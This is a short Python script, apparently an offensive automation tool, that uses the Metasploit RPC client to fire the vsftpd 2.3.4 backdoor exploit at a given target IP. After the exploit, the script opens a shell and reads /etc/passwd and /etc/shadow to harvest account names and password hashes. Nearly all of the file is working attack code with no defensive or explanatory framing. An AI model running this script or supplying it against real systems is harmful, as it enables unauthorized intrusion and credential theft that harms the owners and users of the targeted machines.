import asyncio
import logging
from pymetasploit3.msfrpc import MsfRpcClient
import time

# Configure logger
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

async def exploit_vsftpd_and_get_credentials(target_ip):
    # Connect to msfrpcd (make sure msfrpcd -P mypassword -S is running)
    logger.info("Connecting to msfrpcd...")
    client = MsfRpcClient('admin', server='172.17.0.1', port=55553, ssl=False)

    # Load exploit module
    exploit = client.modules.use('exploit', 'unix/ftp/vsftpd_234_backdoor')
    exploit['RHOSTS'] = target_ip

    # Load payload module
    payload = client.modules.use('payload', 'cmd/unix/interact')

    logger.info(f"[+] Launching exploit against {target_ip} ...")
    job_id = exploit.execute(payload=payload)

    await asyncio.sleep(5)

    sessions = client.sessions.list
    if not sessions:
        logger.warning("[-] No sessions opened. Exploit failed.")
        return None  # Or return {}

    for session_id in sessions:
        logger.info(f"[+] Session {session_id} opened! Collecting user info...")
        shell = client.sessions.session(session_id)

        def run_command(cmd, wait=2):
            shell.write(cmd + '\n')
            time.sleep(wait)
            return shell.read()

        # Collect outputs
        passwd = run_command('cat /etc/passwd')
        logger.info("\n[+] /etc/passwd content:\n%s", passwd)

        shadow = run_command('cat /etc/shadow')
        logger.info("\n[+] /etc/shadow content:\n%s", shadow)

        

        # Return as dict
        return {
            'session_id': session_id,
            'passwd': passwd,
            'shadow': shadow
        }
